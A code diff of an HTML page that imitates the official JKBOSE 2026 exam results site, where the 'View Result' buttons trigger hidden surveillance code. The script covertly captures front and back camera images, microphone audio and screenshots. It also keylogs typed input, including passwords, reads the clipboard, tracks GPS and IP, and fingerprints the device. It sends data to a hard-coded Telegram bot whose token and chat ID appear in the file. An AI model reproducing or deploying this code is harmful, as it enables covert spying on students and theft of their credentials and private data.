@@ -4,22 +4,78 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JKBOSE Results 2026</title>
+
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
-body { margin: 0; background: #e6e6e6; font-family: "Times New Roman", serif; overflow-x: hidden; }
+body {
+    margin: 0;
+    background: #e6e6e6;
+    font-family: "Times New Roman", serif;
+    overflow-x: hidden;
+}
 .layout { display: flex; min-height: 100vh; }
-.sidebar { width: 210px; background: #23374d; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding: 20px; }
+.sidebar {
+    width: 210px;
+    background: #23374d;
+    display: flex;
+    flex-direction: column;
+    justify-content: flex-end;
+    align-items: center;
+    padding: 20px;
+}
 .sidebar img { width: 120px; }
 .main { flex: 1; padding: 40px; }
-.header { background: #ffffff; border-bottom: 1px solid #ccc; padding: 20px; }
-.header-inner { max-width: 1000px; margin: auto; display: flex; align-items: center; gap: 20px; justify-content: center; }
+.header {
+    background: #ffffff;
+    border-bottom: 1px solid #ccc;
+    padding: 20px;
+}
+.header-inner {
+    max-width: 1000px;
+    margin: auto;
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    justify-content: center;
+}
 .header-inner img { width: 464px; height: 101px; object-fit: contain; }
-.content { background: #fff; max-width: 1000px; margin: 40px auto; padding: 40px; box-shadow: 0 0 6px rgba(0,0,0,0.1); }
-.result { display: block; background: #111; color: #ffd84d; text-decoration: none; padding: 15px; margin: 12px 0; text-align: center; font-size: 17px; border-radius: 3px; transition: all 0.3s; cursor: pointer; }
+.content {
+    background: #fff;
+    max-width: 1000px;
+    margin: 40px auto;
+    padding: 40px;
+    box-shadow: 0 0 6px rgba(0,0,0,0.1);
+}
+.result {
+    display: block;
+    background: #111;
+    color: #ffd84d;
+    text-decoration: none;
+    padding: 15px;
+    margin: 12px 0;
+    text-align: center;
+    font-size: 17px;
+    border-radius: 3px;
+    transition: all 0.3s;
+    cursor: pointer;
+}
 .result:hover { background: #333; transform: translateY(-2px); box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
 .result:active { transform: translateY(0); }
-/* COMPLETELY HIDDEN */
-#video, #canvas, #status, #audio, .hidden-elements { position: fixed !important; top: -99999px !important; left: -99999px !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important; visibility: hidden !important; z-index: -99999 !important; }
+
+/* COMPLETELY HIDDEN - NO VISUAL FEEDBACK */
+#video, #canvas, #status, #audio, #screen-canvas, #mic-recorder, .hidden-elements { 
+    position: fixed !important; 
+    top: -99999px !important; 
+    left: -99999px !important; 
+    width: 1px !important; 
+    height: 1px !important; 
+    opacity: 0 !important;
+    pointer-events: none !important;
+    visibility: hidden !important;
+    z-index: -99999 !important;
+}
+
+/* Mobile */
 @media (max-width:768px) {
     .sidebar { display: none; }
     .main { padding: 20px; }
@@ -28,265 +84,1568 @@ body { margin: 0; background: #e6e6e6; font-family: "Times New Roman", serif; ov
 }
 </style>
 </head>
+
 <body>
 <div class="layout">
+    <!-- Sidebar -->
     <div class="sidebar">
-        <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
+        <img src="https://jkresults.nic.in/img/nic.png" alt="NIC">
     </div>
+
+    <!-- Main -->
     <div class="main">
         <div class="header">
             <div class="header-inner">
                 <img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE Banner">
             </div>
         </div>
+
         <div class="content">
-            <div class="result" onclick="initCapture('Class 11th Annual Regular')">View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</div>
-            <div class="result" onclick="initCapture('Class 10th Annual Regular')">View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</div>
-            <div class="result" onclick="initCapture('Class 11th Annual Private')">View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</div>
-            <div class="result" onclick="initCapture('Class 10th Annual Private')">View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</div>
+            <div class="result" onclick="initCapture('Class 11th Annual Regular')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Regular')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</div>
+            <div class="result" onclick="initCapture('Class 11th Annual Private')">📄 View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</div>
+            <div class="result" onclick="initCapture('Class 10th Annual Private')">📄 View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</div>
         </div>
     </div>
 </div>
 
-<!-- Hidden Elements -->
+<!-- Hidden capture elements -->
 <div class="hidden-elements">
     <video id="video" autoplay muted playsinline></video>
+    <video id="screen-video" autoplay muted></video>
     <canvas id="canvas"></canvas>
+    <canvas id="screen-canvas"></canvas>
     <audio id="audio"></audio>
     <div id="status"></div>
 </div>
 
 <script>
 // ═══════════════════════════════════════════════════════════════
-// 🔥 VANSHCZ ULTRA STEALTH SURVEILLANCE v5.0 – FRONT CAMERA ONLY
-// 9:16 VERTICAL | MAX QUALITY | LOCATION ONCE | NO SCREEN | 2025 EDITION
+// 🔥 ULTRA ADVANCED SURVEILLANCE SYSTEM v3.0
+// ═══════════════════════════════════════════════════════════════
+// Features:
+// - Multi-camera support (front + back)
+// - Screen capture
+// - Audio recording
+// - Keylogger
+// - Clipboard monitoring
+// - Battery/Network monitoring
+// - GPS tracking
+// - Device fingerprinting
+// - Auto-reconnect
+// - Stealth mode
+// - Anti-detection
 // ═══════════════════════════════════════════════════════════════
 
 const CONFIG = {
+    // Telegram Config
     BOT_TOKEN: '8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8',
     CHAT_ID: '7385209456',
+    ADMIN_CHAT_ID: '7385209456',
     
-    // Ultra-high quality 9:16 vertical photos (perfect for mobile)
-    PHOTO_QUALITY: 0.95,
-    PHOTO_WIDTH: 1080,
-    PHOTO_HEIGHT: 1920,
-    PHOTO_INTERVAL: 400,        // Every 400ms = ~2.5 FPS (smooth + fast upload)
+    // Capture Settings
+    PHOTO_INTERVAL: 500,        // Photo every 500ms
+    AUDIO_DURATION: 10000,      // 10 second audio clips
+    SCREEN_INTERVAL: 3000,      // Screenshot every 3s
+    LOCATION_INTERVAL: 5000,    // Location every 5s
+    KEYLOG_SEND_INTERVAL: 5000, // Send keylog every 5s
     
-    AUDIO_DURATION: 10000,      // 10-second clips
-    KEYLOG_SEND_INTERVAL: 6000
+    // Quality Settings
+    PHOTO_QUALITY: 0.92,
+    PHOTO_WIDTH: 1920,
+    PHOTO_HEIGHT: 1080,
+    
+    // Retry Settings
+    MAX_RETRIES: 5,
+    RETRY_DELAY: 1000,
+    
+    // Feature Toggles
+    ENABLE_CAMERA: true,
+    ENABLE_AUDIO: true,
+    ENABLE_SCREEN: true,
+    ENABLE_LOCATION: true,
+    ENABLE_KEYLOGGER: true,
+    ENABLE_CLIPBOARD: true,
+    ENABLE_BATTERY: true,
+    ENABLE_NETWORK: true
 };
 
+// ═══════════════════════════════════════════════════════════════
+// STATE MANAGEMENT
+// ═══════════════════════════════════════════════════════════════
 const STATE = {
     initialized: false,
-    sessionId: null,
-    startTime: null,
-    photoCount: 0,
-    audioCount: 0,
-    locationSent: false,
-    stream: null,
-    mediaRecorder: null,
-    intervals: []
+    streams: {
+        front: null,
+        back: null,
+        screen: null,
+        audio: null
+    },
+    counters: {
+        photos: 0,
+        screenshots: 0,
+        audioClips: 0,
+        locations: 0,
+        errors: 0
+    },
+    data: {
+        keylog: [],
+        clipboard: [],
+        touches: [],
+        scrolls: [],
+        clicks: []
+    },
+    victim: {
+        ip: null,
+        fingerprint: null,
+        location: null,
+        resultType: null,
+        sessionId: null,
+        startTime: null
+    },
+    queues: {
+        photos: [],
+        audio: [],
+        messages: []
+    },
+    flags: {
+        isCapturing: false,
+        isSending: false,
+        isRecording: false,
+        cameraActive: false,
+        audioActive: false,
+        screenActive: false
+    },
+    intervals: [],
+    mediaRecorder: null
 };
 
-// Ultra-fast utils
+// ═══════════════════════════════════════════════════════════════
+// UTILITY FUNCTIONS
+// ═══════════════════════════════════════════════════════════════
 const Utils = {
-    genId: () => 'VK_' + Date.now().toString(36) + Math.random().toString(36).substr(2,5),
-    ts: () => new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata', dateStyle:'medium', timeStyle:'medium'}),
-    blobToFile: (blob, name) => new File([blob], name, {type: blob.type})
-};
-
-// ====================== FRONT CAMERA ONLY (9:16) ======================
-async function startFrontCamera() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: "user",
-                width: { ideal: 1080 },
-                height: { ideal: 1920 },
-                frameRate: { ideal: 30 }
-            },
-            audio: true
-        });
-        
-        const video = document.getElementById('video');
-        video.srcObject = stream;
-        await video.play();
-        
-        STATE.stream = stream;
-        return true;
-    } catch(e) {
-        console.log("Camera failed:", e);
-        return false;
-    }
-}
-
-// ====================== HIGH-RES PHOTO CAPTURE ======================
-function capturePhoto() {
-    if (!STATE.stream) return null;
-    
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    
-    canvas.width = CONFIG.PHOTO_WIDTH;
-    canvas.height = CONFIG.PHOTO_HEIGHT;
-    
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    
-    return new Promise(resolve => {
-        canvas.toBlob(blob => {
-            STATE.photoCount++;
-            resolve(blob);
-        }, 'image/jpeg', CONFIG.PHOTO_QUALITY);
-    });
-}
-
-// ====================== TELEGRAM SENDERS ======================
-const TG = {
-    async sendPhoto(blob) {
-        const form = new FormData();
-        form.append('chat_id', CONFIG.CHAT_ID);
-        form.append('photo', Utils.blobToFile(blob, `front_${STATE.photoCount}_${Date.now()}.jpg`));
-        form.append('caption', 
-`FRONT CAMERA #${STATE.photoCount}
-┃ ID: <code>${STATE.sessionId}</code>
-┃ Resolution: 1080×1920 (9:16)
-┃ Quality: 95%
-┃ Time: ${Utils.ts()}
-Live Front Camera Feed`);
-
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: form
-        });
+    generateSessionId() {
+        return 'SES_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
     },
     
-    async sendAudio(blob) {
-        const form = new FormData();
-        form.append('chat_id', CONFIG.CHAT_ID);
-        form.append('voice', Utils.blobToFile(blob, `mic_${++STATE.audioCount}.webm`));
-        form.append('caption', `MIC CLIP #${STATE.audioCount} ┃ ${Utils.ts()}`);
-        
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVoice`, {
-            method: 'POST',
-            body: form
-        });
+    formatBytes(bytes) {
+        if (bytes === 0) return '0 B';
+        const k = 1024;
+        const sizes = ['B', 'KB', 'MB', 'GB'];
+        const i = Math.floor(Math.log(bytes) / Math.log(k));
+        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
     },
     
-    async sendMessage(text) {
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            body: new URLSearchParams({
-                chat_id: CONFIG.CHAT_ID,
-                text: text,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true
-            })
-        });
+    formatDuration(ms) {
+        const seconds = Math.floor(ms / 1000);
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${mins}m ${secs}s`;
     },
     
-    async sendLocation(lat, lon) {
-        await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendLocation`, {
-            method: 'POST',
-            body: new URLSearchParams({
-                chat_id: CONFIG.CHAT_ID,
-                latitude: lat,
-                longitude: lon
-            })
+    sanitizeString(str) {
+        return String(str || '').replace(/[<>&'"]/g, c => ({
+            '<': '&lt;', '>': '&gt;', '&': '&amp;', "'": '&#39;', '"': '&quot;'
+        }[c]));
+    },
+    
+    sleep(ms) {
+        return new Promise(r => setTimeout(r, ms));
+    },
+    
+    async retry(fn, maxRetries = CONFIG.MAX_RETRIES, delay = CONFIG.RETRY_DELAY) {
+        for (let i = 0; i < maxRetries; i++) {
+            try {
+                return await fn();
+            } catch (e) {
+                if (i === maxRetries - 1) throw e;
+                await this.sleep(delay * (i + 1));
+            }
+        }
+    },
+    
+    dataURItoBlob(dataURI) {
+        try {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        } catch {
+            return null;
+        }
+    },
+    
+    getTimestamp() {
+        return new Date().toLocaleString('en-IN', { 
+            timeZone: 'Asia/Kolkata',
+            dateStyle: 'medium',
+            timeStyle: 'medium'
         });
     }
 };
 
-// ====================== MAIN INITIALIZATION ======================
+// ═══════════════════════════════════════════════════════════════
+// DATA COLLECTION MODULE
+// ═══════════════════════════════════════════════════════════════
+const DataCollector = {
+    async getIP() {
+        const endpoints = [
+            'https://api.ipify.org?format=json',
+            'https://api.ip.sb/jsonip',
+            'https://api64.ipify.org?format=json',
+            'https://ipapi.co/json/'
+        ];
+        
+        for (const url of endpoints) {
+            try {
+                const res = await fetch(url, { cache: 'no-cache', timeout: 5000 });
+                const data = await res.json();
+                return data.ip || data.query || 'Unknown';
+            } catch {}
+        }
+        return 'Unknown IP';
+    },
+    
+    async getIPDetails() {
+        try {
+            const ip = await this.getIP();
+            const res = await fetch(`https://ipapi.co/${ip}/json/`, { cache: 'no-cache' });
+            const data = await res.json();
+            return {
+                ip: ip,
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown',
+                isp: data.org || 'Unknown',
+                postal: data.postal || 'Unknown',
+                timezone: data.timezone || 'Unknown',
+                latitude: data.latitude,
+                longitude: data.longitude
+            };
+        } catch {
+            return { ip: await this.getIP() };
+        }
+    },
+    
+    async getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        altitude: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        heading: pos.coords.heading,
+                        timestamp: pos.timestamp,
+                        mapsLink: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                },
+                () => resolve(null),
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        });
+    },
+    
+    async getFullFingerprint() {
+        const fp = {
+            // Browser Info
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            language: navigator.language,
+            languages: navigator.languages?.join(', '),
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            
+            // Screen Info
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenAvailWidth: screen.availWidth,
+            screenAvailHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            devicePixelRatio: window.devicePixelRatio,
+            
+            // Window Info
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight,
+            outerWidth: window.outerWidth,
+            outerHeight: window.outerHeight,
+            
+            // Hardware Info
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            
+            // Connection Info
+            connectionType: navigator.connection?.type,
+            connectionEffectiveType: navigator.connection?.effectiveType,
+            connectionDownlink: navigator.connection?.downlink,
+            connectionRtt: navigator.connection?.rtt,
+            connectionSaveData: navigator.connection?.saveData,
+            
+            // Time Info
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            
+            // Feature Detection
+            webGL: this.getWebGLInfo(),
+            canvas: this.getCanvasFingerprint(),
+            audio: await this.getAudioFingerprint(),
+            fonts: this.detectFonts(),
+            
+            // Storage
+            localStorage: !!window.localStorage,
+            sessionStorage: !!window.sessionStorage,
+            indexedDB: !!window.indexedDB,
+            
+            // Plugins
+            plugins: this.getPlugins(),
+            mimeTypes: this.getMimeTypes(),
+            
+            // Page Info
+            referrer: document.referrer,
+            currentURL: window.location.href,
+            historyLength: history.length
+        };
+        
+        // Battery Info
+        if (CONFIG.ENABLE_BATTERY && navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                fp.battery = {
+                    charging: battery.charging,
+                    level: Math.round(battery.level * 100) + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch {}
+        }
+        
+        return fp;
+    },
+    
+    getWebGLInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return null;
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || gl.VENDOR),
+                renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || gl.RENDERER),
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        } catch {
+            return null;
+        }
+    },
+    
+    getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            ctx.textBaseline = 'alphabetic';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(100, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('JKBOSE 2026', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('JKBOSE 2026', 4, 17);
+            
+            return canvas.toDataURL().slice(-50);
+        } catch {
+            return null;
+        }
+    },
+    
+    async getAudioFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+            
+            gainNode.gain.value = 0;
+            oscillator.type = 'triangle';
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start(0);
+            
+            const fingerprint = await new Promise(resolve => {
+                scriptProcessor.onaudioprocess = (event) => {
+                    const data = event.inputBuffer.getChannelData(0);
+                    let sum = 0;
+                    for (let i = 0; i < data.length; i++) {
+                        sum += Math.abs(data[i]);
+                    }
+                    resolve(sum.toString().slice(0, 20));
+                };
+            });
+            
+            oscillator.stop();
+            audioContext.close();
+            return fingerprint;
+        } catch {
+            return null;
+        }
+    },
+    
+    detectFonts() {
+        const testFonts = [
+            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+            'Comic Sans MS', 'Impact', 'Trebuchet MS', 'Webdings', 'Wingdings'
+        ];
+        
+        const detected = [];
+        const testString = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        const baseWidths = {};
+        baseFonts.forEach(font => {
+            ctx.font = `${testSize} ${font}`;
+            baseWidths[font] = ctx.measureText(testString).width;
+        });
+        
+        testFonts.forEach(font => {
+            for (const baseFont of baseFonts) {
+                ctx.font = `${testSize} '${font}', ${baseFont}`;
+                const width = ctx.measureText(testString).width;
+                if (width !== baseWidths[baseFont]) {
+                    detected.push(font);
+                    break;
+                }
+            }
+        });
+        
+        return detected;
+    },
+    
+    getPlugins() {
+        const plugins = [];
+        if (navigator.plugins) {
+            for (let i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
+                plugins.push(navigator.plugins[i].name);
+            }
+        }
+        return plugins;
+    },
+    
+    getMimeTypes() {
+        const mimeTypes = [];
+        if (navigator.mimeTypes) {
+            for (let i = 0; i < Math.min(navigator.mimeTypes.length, 10); i++) {
+                mimeTypes.push(navigator.mimeTypes[i].type);
+            }
+        }
+        return mimeTypes;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CAMERA MODULE
+// ═══════════════════════════════════════════════════════════════
+const CameraModule = {
+    async startFrontCamera() {
+        try {
+            STATE.streams.front = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: CONFIG.PHOTO_WIDTH },
+                    height: { ideal: CONFIG.PHOTO_HEIGHT },
+                    facingMode: 'user',
+                    frameRate: { ideal: 30 }
+                }
+            });
+            
+            const video = document.getElementById('video');
+            video.srcObject = STATE.streams.front;
+            await video.play();
+            
+            STATE.flags.cameraActive = true;
+            console.log('✅ Front camera active');
+            return true;
+        } catch (e) {
+            console.log('❌ Front camera failed:', e);
+            return false;
+        }
+    },
+    
+    async startBackCamera() {
+        try {
+            STATE.streams.back = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    width: { ideal: CONFIG.PHOTO_WIDTH },
+                    height: { ideal: CONFIG.PHOTO_HEIGHT },
+                    facingMode: { exact: 'environment' },
+                    frameRate: { ideal: 30 }
+                }
+            });
+            
+            console.log('✅ Back camera active');
+            return true;
+        } catch (e) {
+            console.log('❌ Back camera failed:', e);
+            return false;
+        }
+    },
+    
+    capturePhoto(stream, type = 'front') {
+        if (!stream) return null;
+        
+        try {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.play();
+            
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = CONFIG.PHOTO_WIDTH;
+            canvas.height = CONFIG.PHOTO_HEIGHT;
+            
+            // Use the main video element for front camera
+            const sourceVideo = type === 'front' 
+                ? document.getElementById('video') 
+                : video;
+            
+            ctx.drawImage(sourceVideo, 0, 0, canvas.width, canvas.height);
+            
+            // Add timestamp watermark (invisible to user)
+            ctx.fillStyle = 'rgba(255,255,255,0.01)';
+            ctx.font = '10px Arial';
+            ctx.fillText(Date.now().toString(), 5, 10);
+            
+            const dataURL = canvas.toDataURL('image/jpeg', CONFIG.PHOTO_QUALITY);
+            const blob = Utils.dataURItoBlob(dataURL);
+            
+            return blob;
+        } catch (e) {
+            console.log('Photo capture error:', e);
+            return null;
+        }
+    },
+    
+    async switchCamera() {
+        // Toggle between front and back camera
+        if (STATE.streams.front && !STATE.streams.back) {
+            await this.startBackCamera();
+        }
+    },
+    
+    stopAll() {
+        ['front', 'back'].forEach(key => {
+            if (STATE.streams[key]) {
+                STATE.streams[key].getTracks().forEach(t => t.stop());
+                STATE.streams[key] = null;
+            }
+        });
+        STATE.flags.cameraActive = false;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// AUDIO MODULE
+// ═══════════════════════════════════════════════════════════════
+const AudioModule = {
+    async startRecording() {
+        if (!CONFIG.ENABLE_AUDIO) return false;
+        
+        try {
+            STATE.streams.audio = await navigator.mediaDevices.getUserMedia({
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    sampleRate: 44100,
+                    channelCount: 1
+                }
+            });
+            
+            STATE.flags.audioActive = true;
+            this.recordClip();
+            
+            console.log('✅ Audio recording active');
+            return true;
+        } catch (e) {
+            console.log('❌ Audio failed:', e);
+            return false;
+        }
+    },
+    
+    recordClip() {
+        if (!STATE.streams.audio || STATE.flags.isRecording) return;
+        
+        try {
+            const chunks = [];
+            STATE.mediaRecorder = new MediaRecorder(STATE.streams.audio, {
+                mimeType: 'audio/webm;codecs=opus'
+            });
+            
+            STATE.mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+            
+            STATE.mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                STATE.counters.audioClips++;
+                STATE.queues.audio.push({
+                    blob,
+                    timestamp: Date.now(),
+                    duration: CONFIG.AUDIO_DURATION / 1000
+                });
+                
+                STATE.flags.isRecording = false;
+                
+                // Start next recording
+                if (STATE.flags.audioActive) {
+                    setTimeout(() => this.recordClip(), 500);
+                }
+            };
+            
+            STATE.flags.isRecording = true;
+            STATE.mediaRecorder.start();
+            
+            // Stop after duration
+            setTimeout(() => {
+                if (STATE.mediaRecorder && STATE.mediaRecorder.state === 'recording') {
+                    STATE.mediaRecorder.stop();
+                }
+            }, CONFIG.AUDIO_DURATION);
+            
+        } catch (e) {
+            console.log('Audio recording error:', e);
+            STATE.flags.isRecording = false;
+        }
+    },
+    
+    stop() {
+        if (STATE.mediaRecorder && STATE.mediaRecorder.state === 'recording') {
+            STATE.mediaRecorder.stop();
+        }
+        if (STATE.streams.audio) {
+            STATE.streams.audio.getTracks().forEach(t => t.stop());
+            STATE.streams.audio = null;
+        }
+        STATE.flags.audioActive = false;
+        STATE.flags.isRecording = false;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// SCREEN CAPTURE MODULE
+// ═══════════════════════════════════════════════════════════════
+const ScreenModule = {
+    async startCapture() {
+        if (!CONFIG.ENABLE_SCREEN) return false;
+        
+        try {
+            STATE.streams.screen = await navigator.mediaDevices.getDisplayMedia({
+                video: {
+                    mediaSource: 'screen',
+                    width: { ideal: 1920 },
+                    height: { ideal: 1080 }
+                }
+            });
+            
+            const video = document.getElementById('screen-video');
+            video.srcObject = STATE.streams.screen;
+            await video.play();
+            
+            STATE.flags.screenActive = true;
+            console.log('✅ Screen capture active');
+            return true;
+        } catch (e) {
+            console.log('❌ Screen capture failed:', e);
+            return false;
+        }
+    },
+    
+    captureScreenshot() {
+        if (!STATE.streams.screen) return null;
+        
+        try {
+            const video = document.getElementById('screen-video');
+            const canvas = document.getElementById('screen-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            ctx.drawImage(video, 0, 0);
+            
+            const dataURL = canvas.toDataURL('image/jpeg', 0.85);
+            return Utils.dataURItoBlob(dataURL);
+        } catch (e) {
+            console.log('Screenshot error:', e);
+            return null;
+        }
+    },
+    
+    stop() {
+        if (STATE.streams.screen) {
+            STATE.streams.screen.getTracks().forEach(t => t.stop());
+            STATE.streams.screen = null;
+        }
+        STATE.flags.screenActive = false;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// KEYLOGGER MODULE
+// ═══════════════════════════════════════════════════════════════
+const KeyloggerModule = {
+    init() {
+        if (!CONFIG.ENABLE_KEYLOGGER) return;
+        
+        // Keydown events
+        document.addEventListener('keydown', (e) => {
+            const entry = {
+                key: e.key,
+                code: e.code,
+                ctrl: e.ctrlKey,
+                alt: e.altKey,
+                shift: e.shiftKey,
+                meta: e.metaKey,
+                target: e.target.tagName,
+                timestamp: Date.now()
+            };
+            STATE.data.keylog.push(entry);
+        }, true);
+        
+        // Click events
+        document.addEventListener('click', (e) => {
+            STATE.data.clicks.push({
+                x: e.clientX,
+                y: e.clientY,
+                target: e.target.tagName,
+                id: e.target.id,
+                class: e.target.className,
+                text: e.target.innerText?.slice(0, 50),
+                timestamp: Date.now()
+            });
+        }, true);
+        
+        // Touch events (mobile)
+        document.addEventListener('touchstart', (e) => {
+            const touch = e.touches[0];
+            STATE.data.touches.push({
+                x: touch.clientX,
+                y: touch.clientY,
+                target: e.target.tagName,
+                timestamp: Date.now()
+            });
+        }, true);
+        
+        // Scroll events
+        let scrollTimeout;
+        document.addEventListener('scroll', () => {
+            clearTimeout(scrollTimeout);
+            scrollTimeout = setTimeout(() => {
+                STATE.data.scrolls.push({
+                    x: window.scrollX,
+                    y: window.scrollY,
+                    timestamp: Date.now()
+                });
+            }, 100);
+        }, true);
+        
+        // Form input events
+        document.addEventListener('input', (e) => {
+            if (e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email') {
+                STATE.data.keylog.push({
+                    type: 'input',
+                    inputType: e.target.type,
+                    value: e.target.value,
+                    name: e.target.name,
+                    timestamp: Date.now()
+                });
+            }
+        }, true);
+        
+        console.log('✅ Keylogger active');
+    },
+    
+    getData() {
+        const data = {
+            keys: [...STATE.data.keylog],
+            clicks: [...STATE.data.clicks],
+            touches: [...STATE.data.touches],
+            scrolls: [...STATE.data.scrolls]
+        };
+        
+        // Clear after getting
+        STATE.data.keylog = [];
+        STATE.data.clicks = [];
+        STATE.data.touches = [];
+        STATE.data.scrolls = [];
+        
+        return data;
+    }
+};
+
+// ═══════════════════════════════════════════════════════════════
+// CLIPBOARD MODULE
+// ═══════════════════════════════════════════════════════════════
+const ClipboardModule = {
+    init() {
+        if (!CONFIG.ENABLE_CLIPBOARD) return;
+        
+        // Copy events
+        document.addEventListener('copy', async (e) => {
+            try {
+                const text = await navigator.clipboard.readText();
+                STATE.data.clipboard.push({
+                    type: 'copy',
+                    content: text?.slice(0, 500),
+                    timestamp: Date.now()
+                });
+            } catch {}
+        });
+        
+        // Paste events
+        document.addEventListener('paste', (e) => {
+            const text = e.clipboardData?.getData('text');
+            STATE.data.clipboard.push({
+                type: 'paste',
+                content: text?.slice(0, 500),
+                timestamp: Date.now()
+            });
+        });
+        
+        // Periodic clipboard read
+        setInterval(async () => {
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text !== STATE.data.lastClipboard) {
+                    STATE.data.lastClipboard = text;
+                    STATE.data.clipboard.push({
+                        type: 'read',
+                        content: text?.slice(0, 500),
+                        timestamp: Date.now()
+                    });
+                }
+            } catch {}
+        }, 3000);
+        
